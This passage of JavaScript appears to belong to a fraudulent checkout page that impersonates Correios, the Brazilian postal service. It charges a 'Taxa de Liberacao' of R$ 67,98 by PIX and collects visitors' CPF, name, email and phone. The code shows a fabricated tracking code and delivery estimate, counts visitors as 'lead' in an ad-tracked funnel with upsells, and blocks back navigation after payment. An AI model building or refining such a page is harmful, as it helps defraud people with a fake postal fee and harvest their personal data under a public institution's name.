    // GERAR PIX
    // ========================================
    
    async function gerarPix() {
        showStep2();

        // Previne múltiplas requisições simultâneas
        if (state.isGenerating) {
            return;
        }

        // Coleta dados da sessão ou URL
        const sessionData = getSessionData();
        let cpf = (
            localStorage.getItem('correios_cpf') ||
            getQueryParam('cpf') ||
            sessionData?.cpf ||
            ''
        ).replace(/\D/g, '');

        let nome = decodeName(
            localStorage.getItem('correios_nome') ||
            elements.dadosNome?.value ||
            getQueryParam('nome') ||
            sessionData?.nome ||
            ''
        );
        if (isGenericName(nome)) nome = '';

        const email = String(localStorage.getItem('correios_email') || '').trim().toLowerCase();
        const telefone = String(localStorage.getItem('correios_telefone') || '').replace(/\D/g, '');

        if (cpf && cpf.length === 11 && !validarCPF(cpf)) {
            cpf = '';
        }

        if (cpf && cpf.length !== 11) {
            cpf = '';
        }

        // Verifica se já existe uma transação válida
        const transacaoExistente = recuperarTransacao();
        
        if (transacaoExistente) {
            let transacaoMorta = false;

            try {
                const statusResponse = await fetch(`/api/status-pix?id=${encodeURIComponent(transacaoExistente.hash)}`, {
                    method: 'GET'
                });
                if (!statusResponse.ok) {
                    throw new Error(`Erro do servidor (${statusResponse.status})`);
                }
                const statusResult = await statusResponse.json();

                if (statusResult.success && statusResult.data && statusResult.data.status) {
                    if (statusResult.data.status === 'PAID') {
                        trackCheckoutEvent('pagamento_confirmado', {
                            source: 'cached_transaction_paid'
                        });
                        limparTransacao();
                        window.location.replace(CONFIG.REDIRECT_URL_SUCESSO);
                        return;
                    }

                    const st = statusResult.data.status.toLowerCase();
                    if (['expired', 'cancelled', 'canceled', 'refunded', 'failed', 'refused'].includes(st)) {
                        limparTransacao();
                        transacaoMorta = true;
                    }
                }
            } catch (_) {
            }

            if (!transacaoMorta) {
                state.transactionHash = transacaoExistente.hash;
                state.pixCode = transacaoExistente.pix_code;
                state.expirationTime = transacaoExistente.created_at + CONFIG.TRANSACTION_EXPIRY_MS;

                exibirDadosPix({
                    pix_code: transacaoExistente.pix_code,
                    pix_qrcode: transacaoExistente.pix_qrcode,
                    qr_base64: transacaoExistente.qr_base64,
                    amount_formatted: transacaoExistente.amount_formatted,
                    receiver: transacaoExistente.receiver || null
                });
                trackCheckoutEvent('pix_gerado', {
                    reused: true,
                    transaction_hash: transacaoExistente.hash
                });

                mostrarConteudo();
                iniciarVerificacaoStatus();
                iniciarTimer();
                return;
            }
        }

        // Gera nova transação
        state.isGenerating = true;
        mostrarLoading();

        try {
            const src = getSrc();

            // Coleta UTMs e Google Ads tracking da URL
            const urlParams = new URLSearchParams(window.location.search);
            const googleTracking = getGoogleTracking();
            const tracking = {
                // Identificador da conta Google Ads
                src: src,
                
                // Google Ads Click IDs (ESSENCIAIS para conversão!)
                gclid: urlParams.get('gclid') || googleTracking.gclid || '',
                gbraid: urlParams.get('gbraid') || googleTracking.gbraid || '',  // iOS 14+
                wbraid: urlParams.get('wbraid') || googleTracking.wbraid || '',  // Web-to-app
                
                // UTM Parameters
                utm_source: urlParams.get('utm_source') || '',
                utm_medium: urlParams.get('utm_medium') || '',
                utm_campaign: urlParams.get('utm_campaign') || '',
                utm_term: urlParams.get('utm_term') || '',
                utm_content: urlParams.get('utm_content') || ''
            };

            if (tracking.gclid || tracking.gbraid || tracking.wbraid) {
                localStorage.setItem(TRACKING_STORAGE_KEY, JSON.stringify({
                    gclid: tracking.gclid,
                    gbraid: tracking.gbraid,
                    wbraid: tracking.wbraid
                }));
            }

            // Obtém imagem que foi exibida na página de encomenda (para A/B test)
            const imagemNota = localStorage.getItem('correios_imagem_nota') || '';
            
            // Chama a API Freepay Brasil para gerar PIX
            const docNumber = cpf || '12345678900';
            const docType = docNumber.length === 14 ? 'cnpj' : 'cpf';

            const response = await fetch('/api/criar-pix', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    "amount": 6798,
                    "payment_method": "pix",
                    "customer": {
                        "name": nome || "Cliente Nao Informado",
                        "email": email || "cliente@naoinformado.com",
                        "phone": telefone || "+5511999999999",
                        "document": {
                            "number": docNumber,
                            "type": docType
                        }
                    },
                    "items": [
                        {
                            "title": "Taxa de Liberacao",
                            "unit_price": 6798,
                            "quantity": 1,
                            "tangible": false,
                            "external_ref": tracking.src || "taxa_liberacao_correios"
                        }
                    ],
                    "pix": {
                        "expires_in_days": 1
                    },
                    "metadata": {
                        "provider_name": "Correios"
                    },
                    "installments": 1,
                    "ip": "127.0.0.1"
                })
            });

            if (!response.ok) {
                throw new Error(`Erro do servidor (${response.status})`);
            }
            const freepayResult = await response.json();

            if (!freepayResult.success || !freepayResult.data || !freepayResult.data.id || !freepayResult.data.pix) {
                throw new Error('Erro ao gerar PIX');
            }

            // Converter resposta do Freepay para o formato que a UI do checkout já utiliza
            const result = {
                success: true,
                data: {
                    transaction_hash: freepayResult.data.id,
                    pix_code: freepayResult.data.pix.qr_code,
                    pix_qrcode: freepayResult.data.pix.qr_code,
                    amount: freepayResult.data.amount || 6798,
                    amount_formatted: 'R$ 67,98',
                    customer: {
                        cpf: cpf,
                        nome: nome,
                        email: email,
                        telefone: telefone
                    }
                }
            };

            // Salva transação no localStorage
            const transacaoSalva = salvarTransacao(result.data, cpf);

            // Salva dados do cliente para consistência nos upsells
            if (result.data.customer) {
                localStorage.setItem('correios_cpf', result.data.customer.cpf || '');
                const customerNome = result.data.customer.nome || '';
                localStorage.setItem('correios_nome', isGenericName(customerNome) ? '' : customerNome);
                localStorage.setItem('correios_email', result.data.customer.email || '');
                localStorage.setItem('correios_telefone', result.data.customer.telefone || '');
            }

            // Atualiza estado
            state.transactionHash = result.data.transaction_hash;
            state.pixCode = result.data.pix_code;
            state.expirationTime = Date.now() + CONFIG.TRANSACTION_EXPIRY_MS;
            trackCheckoutEvent('pix_gerado', {
                reused: Boolean(result.data.reused),
                transaction_hash: result.data.transaction_hash
            });

            // Atualiza UI
            exibirDadosPix(result.data);
            mostrarConteudo();

            // Inicia verificação de status e timer
            iniciarVerificacaoStatus();
            iniciarTimer();

        } catch (error) {
            mostrarErro(error.message || 'Erro ao gerar código PIX. Tente novamente.');
        } finally {
            state.isGenerating = false;
            resetTurnstile();
        }
    }

    // ========================================
    // EXIBIR DADOS PIX
    // ========================================
    
    function exibirDadosPix(data) {
        // Valor
        elements.valorPagar.textContent = data.amount_formatted || 'R$ 0,00';
        updateResumoPagamento();
        const receiverInfo = updateRecebedorPixInfo(data);
        trackCheckoutEvent('receiver_info_loaded', {
            receiver_info_visible: Boolean(receiverInfo?.visible),
            receiver_info_complete: Boolean(receiverInfo?.complete),
            receiver_has_name: Boolean(receiverInfo?.hasName),
            receiver_has_document: Boolean(receiverInfo?.hasDocument)
        });

        // QR Code - prioriza base64 do backend, senão gera localmente
        const pixCode = data.pix_code || data.pix_qrcode || '';
        
        if (data.qr_base64) {
            elements.qrcodeImg.src = data.qr_base64;
        } else if (pixCode) {
            const qrLocal = gerarQRCodeLocal(pixCode);
            if (qrLocal) {
                elements.qrcodeImg.src = qrLocal;
            }
        }

        // Código Copia e Cola
        elements.pixCode.value = data.pix_code || '';
    }

    // ========================================
    // COPIAR CÓDIGO
    // ========================================
    
    window.copiarCodigo = async function() {
        const codigo = elements.pixCode.value;
        
        if (!codigo) return;

        try {
            await navigator.clipboard.writeText(codigo);
            trackCheckoutEvent('pix_copiado', { copy_method: 'clipboard_api' });
            
            // Feedback visual
            const btnCopiar = elements.btnCopiar;
            const textoOriginal = btnCopiar.innerHTML;
            
            btnCopiar.innerHTML = '<i class="fas fa-check"></i><span>Copiado!</span>';
            btnCopiar.classList.add('copiado');
            
            // Seleciona o texto
            elements.pixCode.select();
            
            // Vibra se disponível
            if (navigator.vibrate) {
                navigator.vibrate(100);
            }
            
            setTimeout(() => {
                btnCopiar.innerHTML = textoOriginal;
                btnCopiar.classList.remove('copiado');
            }, 2000);
            
        } catch (err) {
            // Fallback para navegadores antigos
            elements.pixCode.select();
            document.execCommand('copy');
            trackCheckoutEvent('pix_copiado', { copy_method: 'exec_command' });
            
            alert('Código copiado!');
        }
    };

    // ========================================
    // VERIFICAÇÃO DE STATUS
    // ========================================
    
    function iniciarVerificacaoStatus() {
        // Limpa intervalo anterior se existir
        if (state.checkStatusInterval) {
            clearInterval(state.checkStatusInterval);
        }

        // Verifica imediatamente
        verificarStatus();
        
        // Depois verifica periodicamente
        state.checkStatusInterval = setInterval(verificarStatus, CONFIG.CHECK_STATUS_INTERVAL);
    }

    async function verificarStatus() {
        if (!state.transactionHash) return;

        try {
            const response = await fetch(`/api/status-pix?id=${encodeURIComponent(state.transactionHash)}`, {
                method: 'GET'
            });
            if (!response.ok) {
                throw new Error(`Erro do servidor (${response.status})`);
            }
            const result = await response.json();

            if (result.success && result.data && result.data.status === 'PAID') {
                pagamentoConfirmado();
            }
        } catch (_) {
        }
    }

    function pagamentoConfirmado() {
        // Para verificações
        pararVerificacoes();
        trackCheckoutEvent('pagamento_confirmado', {
            source: 'status_polling'
        });

        // Limpa transação salva
        limparTransacao();
        
        // ========================================
        // SALVA ESTADO DO FUNIL
        // Evita que o lead volte para página inicial
        // Expira em 24 horas
        // ========================================
        const funnelData = {
            stage: 'frontend_paid',
            timestamp: Date.now()
        };
        localStorage.setItem(FUNNEL_STAGE_KEY, JSON.stringify(funnelData));
        // Atualiza UI
        elements.statusAguardando.style.display = 'none';
        elements.statusPago.style.display = 'flex';

        // Vibra se disponível
        if (navigator.vibrate) {
            navigator.vibrate([200, 100, 200]);
        }

        // Redireciona após alguns segundos
        // Usa replace() para substituir histórico e evitar "voltar"
        setTimeout(() => {
            const sessionData = getSessionData();
            const rastreio = sessionData?.codigoRastreio || '';
            const redirectUrl = rastreio 
                ? `${CONFIG.REDIRECT_URL_SUCESSO}?rastreio=${encodeURIComponent(rastreio)}`
                : CONFIG.REDIRECT_URL_SUCESSO;
            
            // Substitui histórico para evitar voltar
            window.location.replace(redirectUrl);
        }, 3000);
    }

    // ========================================
    // TIMER DE EXPIRAÇÃO
    // ========================================
    
    function iniciarTimer() {
        // Limpa timer anterior se existir
        if (state.timerInterval) {
            clearInterval(state.timerInterval);
        }

        atualizarTimer();
        state.timerInterval = setInterval(atualizarTimer, 1000);
    }

    function atualizarTimer() {
        const agora = Date.now();
        const restante = state.expirationTime - agora;
        const total = CONFIG.TRANSACTION_EXPIRY_MS;

        if (restante <= 0) {
            // Expirado
            pararVerificacoes();
            limparTransacao();
            elements.timerExpiracao.textContent = '00:00';
            if (elements.timerProgressBar) {
                elements.timerProgressBar.style.width = '0%';
            }
            mostrarErro('O código PIX expirou. Clique em "Tentar Novamente" para gerar um novo código.');
            return;
        }

        const minutos = Math.floor(restante / 60000);
        const segundos = Math.floor((restante % 60000) / 1000);

        elements.timerExpiracao.textContent = 
            `${String(minutos).padStart(2, '0')}:${String(segundos).padStart(2, '0')}`;
        
        // Atualiza barra de progresso
        if (elements.timerProgressBar) {
            const porcentagem = (restante / total) * 100;
            elements.timerProgressBar.style.width = `${porcentagem}%`;
        }
    }

    // ========================================
    // INICIALIZAÇÃO
    // ========================================
    
    async function init() {
        const funnelData = getFunnelData();
        if (funnelData?.stage) {
            const redirectUrl = getRedirectByFunnelStage(funnelData.stage);
            if (redirectUrl) {
                window.location.replace(redirectUrl);
                return;
            }
        }

        initTurnstile();

        // Exibe nome do usuário no header
        exibirNomeHeader();
        state.trackingOrigin = detectTrackingOrigin();

        // Captura src da URL — quando src muda (outra conta), limpa click params antigos
        // DEVE rodar ANTES de qualquer beacon/tracking para evitar enviar dados de outra conta
        const srcUrl = getQueryParam('src');
        if (srcUrl && srcUrl !== 'ERR') {
            const srcAnterior = localStorage.getItem(SRC_STORAGE_KEY);
            if (srcAnterior && srcAnterior !== srcUrl) {
                localStorage.removeItem(TRACKING_STORAGE_KEY);
                localStorage.removeItem(LEGACY_TRACKING_STORAGE_KEY);
            }
            localStorage.setItem(SRC_STORAGE_KEY, srcUrl);
        }

        // Captura tracking Google Ads da URL/storage/cookie
        capturarGoogleTracking();

        // Funnel token: POST para save-tracking APÓS alinhar src e tracking
        await initFunnelToken();

        initStep1Events();
        populateStep1Form();
        if (!state.checkoutViewTracked) {
            trackCheckoutEvent('checkout_view');
            state.checkoutViewTracked = true;
        }

        // Salva código de rastreio da URL ou sessão para a página de sucesso
        const sessionData = getSessionData();
        const rastreio = getQueryParam('rastreio') || sessionData?.codigoRastreio || '';
        if (rastreio) {
            localStorage.setItem('correios_rastreio', rastreio);
        }
        
        // Exibe código de rastreio no header da página de pagamento
        exibirCodigoRastreioHeader(rastreio);
        
        // Calcula e salva previsão de entrega (5 dias úteis)
        const previsao = calcularPrevisaoEntrega();
        localStorage.setItem('correios_previsao_entrega', previsao);

        // Verifica se já tem PIX salvo e mostra instantaneamente
        const transacaoSalva = recuperarTransacao();
        if (transacaoSalva) {
            // Configura estado
            state.transactionHash = transacaoSalva.hash;
            state.pixCode = transacaoSalva.pix_code;
            state.expirationTime = transacaoSalva.created_at + CONFIG.TRANSACTION_EXPIRY_MS;
            
            // Exibe imediatamente (sem loading)
            exibirDadosPix({
                pix_code: transacaoSalva.pix_code,
                pix_qrcode: transacaoSalva.pix_qrcode,
                qr_base64: transacaoSalva.qr_base64,
                amount_formatted: transacaoSalva.amount_formatted,
                receiver: transacaoSalva.receiver || null
            });
            showStep2();
            mostrarConteudo();
            trackCheckoutEvent('pix_gerado', {
                reused: true,
                transaction_hash: transacaoSalva.hash
            });
            
            // Inicia verificações
            iniciarVerificacaoStatus();
            iniciarTimer();
            return;
        }

        // Sem transação: inicia na etapa de coleta
        showStep1();
        updateResumoPagamento();
    }
    
    // Exibe código de rastreio no header
    function exibirCodigoRastreioHeader(rastreio) {
        const headerRastreio = document.getElementById('codigoRastreioHeader');
        if (headerRastreio) {
            // Prioridade: parâmetro > URL > localStorage
            const rastreioFinal = rastreio || getQueryParam('rastreio') || localStorage.getItem('correios_rastreio');
            
            if (rastreioFinal) {
                // Formata o código de rastreio (adiciona espaços para melhor legibilidade)
                const rastreioLimpo = rastreioFinal.replace(/\s/g, '').toUpperCase();
                const rastreioFormatado = rastreioLimpo.replace(/(.{2})(.{3})(.{3})(.{3})(.{2})/, '$1 $2 $3 $4 $5');
                headerRastreio.textContent = rastreioFormatado;
            } else {
                headerRastreio.textContent = 'Taxa de Liberação';
            }
        }
    }

    // Calcula previsão de entrega (5 dias úteis)
    function calcularPrevisaoEntrega() {
        const hoje = new Date();
        let diasAdicionados = 0;
        
        while (diasAdicionados < 5) {
            hoje.setDate(hoje.getDate() + 1);
            const diaSemana = hoje.getDay();
            if (diaSemana !== 0 && diaSemana !== 6) {
                diasAdicionados++;
            }
        }
        
        const dia = hoje.getDate().toString().padStart(2, '0');
        const mes = (hoje.getMonth() + 1).toString().padStart(2, '0');
        const ano = hoje.getFullYear();
        
        const diasSemana = ['Domingo', 'Segunda', 'Terça', 'Quarta', 'Quinta', 'Sexta', 'Sábado'];
        const diaSemanaTexto = diasSemana[hoje.getDay()];
        
        return `${diaSemanaTexto}, ${dia}/${mes}/${ano}`;
    }

    // Expõe função para botão "Tentar Novamente"
    window.gerarPix = async function() {
        // Limpa transação existente e gera nova
        limparTransacao();
        state.isGenerating = false;
        showStep2();
        await gerarPix();
    };

    // Cleanup ao sair da página
    window.addEventListener('beforeunload', function() {
        pararVerificacoes();
    });

    // Aguarda DOM
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

})();
